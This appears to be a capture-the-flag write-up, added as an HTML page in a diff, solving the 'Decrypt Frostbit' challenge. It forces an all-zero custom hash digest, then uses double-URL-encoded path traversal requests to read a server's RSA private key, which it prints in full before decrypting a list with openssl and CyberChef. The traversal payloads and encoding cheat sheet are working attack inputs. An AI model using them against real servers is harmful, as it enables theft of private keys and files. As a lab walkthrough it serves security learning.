+        self.filename_bytes = filename_bytes
+        self.filename_bytes_length = len(self.filename_bytes)
+        self.nonce_bytes = nonce_bytes
+        self.nonce_bytes_length = len(self.nonce_bytes)
+        self.hash_length = hash_length
+        self.hash_result = self._compute_hash()
+
+    def _compute_hash(self) -&gt; bytes:
+        hash_result = bytearray(self.hash_length)
+        count = 0
+
+        for i in range(len(self.file_bytes)):
+            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
+            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
+            count += 1
+
+        for i in range(len(self.filename_bytes)):
+            count_mod = count % self.hash_length
+            count_filename_mod = count % self.filename_bytes_length
+            count_nonce_mod = count % self.nonce_bytes_length
+            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
+            hash_result[count_mod] = hash_result[count_mod] &amp; xrd
+            count += 1
+
+        return bytes(hash_result)
+
+    def digest(self) -&gt; bytes:
+        &quot;&quot;&quot;Returns the raw binary hash result.&quot;&quot;&quot;
+        return self.hash_result
+
+    def hexdigest(self) -&gt; str:
+        &quot;&quot;&quot;Returns the hash result as a hexadecimal string.&quot;&quot;&quot;
+        return binascii.hexlify(self.hash_result).decode()
+
+    def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):
+        &quot;&quot;&quot;Updates the internal state with new bytes and recomputes the hash.&quot;&quot;&quot;
+        if file_bytes is not None:
+            self.file_bytes = file_bytes
+        if filename_bytes is not None:
+            self.filename_bytes = filename_bytes
+        if nonce_bytes is not None:
+            self.nonce_bytes = nonce_bytes
+
+        self.hash_result = self._compute_hash()
+
+    def validate(self, hex_string: str):
+        &quot;&quot;&quot;Validates if the provided hex string matches the computed hash.&quot;&quot;&quot;
+        try:
+            decoded_bytes = binascii.unhexlify(hex_string)
+            if decoded_bytes == self.digest():
+                return True, None
+        except Exception as e:
+            stack_trace = traceback.format_exc()
+            return False, f&quot;{stack_trace}&quot;
+        return False, None
+</code></pre>
+<p>The code seems to compute the hash by performing an XOR operation with the file contents and the nonce. After that, it XORs the filename and the nonce and the result does an AND with the result of the first XOR.</p>
+<p>To better understand and experiment with this process, I created a Python script that interacts with the <code>Frostbyte128</code> class, allowing me to test different values and potentially identify any weaknesses in the way the hash is calculated. Here's the code I developed:</p>
+<pre><code class="language-python">#!/usr/bin/env python
+
+import sys
+import os
+import binascii
+from FrostBiteHashlib import Frostbyte128
+
+input_file = sys.argv[1]
+input_filename = sys.argv[2]
+input_nonce = sys.argv[3]
+
+print(&quot;Arguments received:&quot;, sys.argv)
+
+with open(input_file, 'rb') as file:
+    file_data = file.read()
+
+filename_bytes = binascii.unhexlify(input_filename)
+nonce_bytes = binascii.unhexlify(input_nonce)
+
+# Compute the hash using Frostbyte128
+frostbyte_hash = Frostbyte128(file_data, filename_bytes, nonce_bytes)
+
+# Output the resulting hash
+print(frostbyte_hash.hexdigest())
+</code></pre>
+<p>I started noticing that in certain cases, specially with filenames with all 'F' and '0', I could find collisions. For example:</p>
+<pre><code>python3 hash-calculator.py test.txt 0FFFFF0FFFFFFFFFFFFF a899f16565491df4
+Arguments received: ['hash-calculator.py', 'test.txt', '0FFFFF0FFFFFFFFFFFFF', 'a899f16565491df4']
+510406020a1210091051331a6f32009b
+</code></pre>
+<pre><code>python3 hash-calculator.py test.txt 0FFFFF0FFFFFFFF0000F a899f16565491df4
+Arguments received: ['hash-calculator.py', 'test.txt', '0FFFFF0FFFFFFFF0000F', 'a899f16565491df4']
+510406020a1210091051331a6f32009b
+</code></pre>
+<p>Comparing next to each other:</p>
+<pre><code>510406020a1210091051331a6f32009b
+510406020a1210091051331a6f32009b
+</code></pre>
+<p>This prompted me to look to the algorithm again in detail and I noticed something interesting: </p>
+<p>The second loop performs an XOR of the filename and the nonce. Since we know the nonce, if we set nonce=filename, the result of the XOR operation should yield all zeros. This is due to the fact that any value XORed with itself results in zero. Next, the algorithm performs an AND operation between the result of this XOR and the the first loop's XOR, which involves the file contents. Since one of the operands in the AND operation is all 0s, the final result of the AND operation will also be all zeros.</p>
+<p>I tested my theory:</p>
+<pre><code>python3 hash-calculator.py test.txt a899f16565491df4 a899f16565491df4
+Arguments received: ['hash-calculator.py', 'test.txt', 'a899f16565491df4', 'a899f16565491df4']
+000000000000591d1051331a6f320000
+</code></pre>
+<p>Hmmmm, not the all-zeros result I expected. Wait! Of course! the hash length is 16 bytes! Since our nonce is 8 bytes, we need to use it twice:</p>
+<pre><code>python3 hash-calculator.py test.txt a899f16565491df4a899f16565491df4 a899f16565491df4
+Arguments received: ['hash-calculator.py', 'test.txt', 'a899f16565491df4a899f16565491df4', 'a899f16565491df4']
+00000000000000000000000000000000
+</code></pre>
+<p>Success! I had figured out how to control the hash result. For this trick to work, I need the filename value to be equal to the nonce, twice in this case to cover the 16 bytes.</p>
+<p>The next task was to figure out how to send a filename that matched the nonce twice while still gaining access to my target file. From my the Santa Vision, we know that our ultimate target is to get access to <code>/etc/nginx/certs/api.frostbit.app.key</code>. We can use the vulnerability to find the file:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+GET /view/%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true HTTP/2
+</pre>
+
+<p>The answer from the server confirms that's the right path! Key located.</p>
+<p>To speed up my testing, I created a handy cheatsheet for URL double encoding:</p>
+<pre><code>% = %2525
+/ = %252f
+../ = %252e%252e%252f
+./ = %252e%252f
+/. = %252f%252e
+// = %252f%252f
+/./ = %252f%252e%252f
+</code></pre>
+<p>After some trial and error, I hit upon a breakthrough. I made the following request:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+GET /view/%252e%252e%252frandom%252f%252e%252e%252fstatic%252ffrostbit.png/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true HTTP/2
+</pre>
+
+<p>The above sends the following query: <code>../random/../static/frostbit.png/</code> and the server responded with:</p>
+<pre><code>{&quot;debug&quot;:true,&quot;error&quot;:&quot;Invalid Status Id or Digest&quot;}
+</code></pre>
+<p>At this point, it became clear that the backend was resolving paths, essentially running something similar to this:</p>
+<pre><code>os.path.realpath('random/../../../../../etc/passwd')
+'/home/kali/etc/passwd'
+</code></pre>
+<p>That returns the canonical path of a specified file or directory, so relative paths will be resolved and removed.</p>
+<p>As usual, let's test the theory and add the nonce at the beginning of the path to access our known file:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+GET /view/a899f16565491df4a899f16565491df4%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=00000000000000000000000000000000&debug=true HTTP/2
+</pre>
+
+<pre><code>{&quot;debug&quot;:true,&quot;error&quot;:&quot;Invalid Status Id or Digest&quot;}
+</code></pre>
+<p>This was frustrating! I was pretty sure that should have worked. This challenge is full of additional traps and small steps... Checking my hash-calculator.py script, I realized something important: I was handling the correct formats myself so that the right values were passed to FrostBiteHashlib. I need to send the data as hex (and of course, double encoded to bypass the proxy)! So the nonce value should be:</p>
+<p><code>a899f16565491df4</code><br>
+The format is hex so:<br>
+<code>%a8%99%f1%65%65%49%1d%f4</code><br>
+Then double encoding it:<br>
+<code>%25a8%2599%25f1%2565%2565%2549%251d%25f4</code></p>
+<p>And now twice:</p>
+<p><code>%25a8%2599%25f1%2565%2565%2549%251d%25f4%25a8%2599%25f1%2565%2565%2549%251d%25f4</code></p>
+<p>Let's try:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+GET /view/%25a8%2599%25f1%2565%2565%2549%251d%25f4%25a8%2599%25f1%2565%2565%2549%251d%25f4%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=00000000000000000000000000000000&debug=true HTTP/2
+</pre>
+
+<p>FINALLY! Many hours later, this provides the answer we were looking for, and we get the contents of the key file:</p>
+<p><img alt="RSA Key" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-5.png" /></p>
+<p>The entire file is below:</p>
+<pre><code>
+        -----BEGIN RSA PRIVATE KEY-----
+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
+        -----END RSA PRIVATE KEY-----
+</code></pre>
+<p>From the pcap and the memory dump, we had the following encrypted key:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+{"encryptedkey":"1f431a1614b6d4c6ae0081276934e1a9e8b5426e048eb5a57f80c21e3fb4453c283ca31d2854b2071fef019d1cb1c444d4bf0f4982ea780531ec86163747b31bc2f5a8c2f08fda8211466b1493af279bac4fd5357d8e316cbbd6e5eaf31b382598dfeef14ec1e0ee6ab3c7da1a635ea39e1e16998f250498440f0c751bc40a3dd7fb268778ad46ac337ec1fc59de6e35c107953524479b76aca264e56e4d6d5057d3b552314eae0461445cda615ea8acccc68f0cf75bf089253deb6313325dc008f4549d564965907a87b2a3e1099792bfe49a566dda8a8e7278f73a32c4345ab2f8f99caf4bc51acfd7c47d2e18aa59c3654b59960f7e1fd9cdf88cd1fd9b7ccacc539d1c23d58e1bc9bdc008aa6711a0c3db4d8e965d89125f0d3b92f743caed7266d304a8bdb49f6298ab67e4cbbbeef583e41f81f311aba208e755b038eab3dff0a441ffc469c7501592667924b7cb0048e5186c04547ef47d28f61eb970609c88bc9122144ba5f9f20ec55e0fd6c84b57ac662155f9743902222e3f653def2a715ea33232271c8dde8d82809e98c7e6b87c0924e60394fe35e7c299bff7898ddf1c9de3e667bc1e3b1423cb48e01c7f1931aec88327b0f64c34c66ef301bccbb6396ba0efd0c1786ea590803739e80ed880e72930810a7b352cf537ab8896d5c105837cfae32045811f80c50cabd6b5eac4eff08968ce7437705d476f45","nonce":"a899f16565491df4"}
+</pre>
+
+<p>Using the RSA key, we can decrypt the key with openssl:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+echo "1f431a1614b6d4c6ae0081276934e1a9e8b5426e048eb5a57f80c21e3fb4453c283ca31d2854b2071fef019d1cb1c444d4bf0f4982ea780531ec86163747b31bc2f5a8c2f08fda8211466b1493af279bac4fd5357d8e316cbbd6e5eaf31b382598dfeef14ec1e0ee6ab3c7da1a635ea39e1e16998f250498440f0c751bc40a3dd7fb268778ad46ac337ec1fc59de6e35c107953524479b76aca264e56e4d6d5057d3b552314eae0461445cda615ea8acccc68f0cf75bf089253deb6313325dc008f4549d564965907a87b2a3e1099792bfe49a566dda8a8e7278f73a32c4345ab2f8f99caf4bc51acfd7c47d2e18aa59c3654b59960f7e1fd9cdf88cd1fd9b7ccacc539d1c23d58e1bc9bdc008aa6711a0c3db4d8e965d89125f0d3b92f743caed7266d304a8bdb49f6298ab67e4cbbbeef583e41f81f311aba208e755b038eab3dff0a441ffc469c7501592667924b7cb0048e5186c04547ef47d28f61eb970609c88bc9122144ba5f9f20ec55e0fd6c84b57ac662155f9743902222e3f653def2a715ea33232271c8dde8d82809e98c7e6b87c0924e60394fe35e7c299bff7898ddf1c9de3e667bc1e3b1423cb48e01c7f1931aec88327b0f64c34c66ef301bccbb6396ba0efd0c1786ea590803739e80ed880e72930810a7b352cf537ab8896d5c105837cfae32045811f80c50cabd6b5eac4eff08968ce7437705d476f45" | xxd -r -p | openssl rsautl -decrypt -inkey api.frostbit.app.key
+</pre>
+
+<pre><code>14ab53643d6f1da969ad7fb8df4fdd63,a899f16565491df4 
+</code></pre>
+<p>The puzzles in this challenge just keep coming... Now it appears that <code>14ab53643d6f1da969ad7fb8df4fdd63</code> may be the decryption key, while <code>a899f16565491df4</code>, which, by the way, is our nonce, the IV. We need to use this key and IV to decrypt the naughty nice list. The above key is 16 bytes, so likely AES-128 was used. The main question left is what mode was used. I went to CyberChef and started experimenting with various options. It didn’t take long to figure it out, as I correctly guessed that CBC was the mode used. And voilà, decryption was successful.</p>
+<p><img alt="Naughty Nice list decrypted" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-6.png" /></p>
+<p>The settings used were:</p>
+<p>Key (UTF8): <code>14ab53643d6f1da969ad7fb8df4fdd63</code><br>
+IV (UTF8): <code>a899f16565491df4</code><br>
+Mode: CBC<br>
+Input: Raw
+Output: Raw</p>
+<p>And with that, we can finally reveal the contents of <strong>line 440</strong>:</p>
+<p><strong>440,Xena Xtreme,13,Naughty,Had a surprise science experiment in the garage and left a mess with the supplies</strong></p>
+<p>Honestly, I hope I never cross paths with someone named Xena...</p>
+<p>Answer for Decrypt Frostbit: <strong>Xena Xtreme</strong></p>
+<h1 id="final-message-from-tangle-coalbox">Final Message from Tangle Coalbox</h1>
+<p>After decrypting the naughty-nice list, Tangle Coalbox thanks us for saving Christmas!</p>
+<p><img alt="Tangle Coalbox Conversation 3" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Tangle%20Coalbox-3.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.path"], "search": "../../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
+      
+    
+  </body>
+</html>
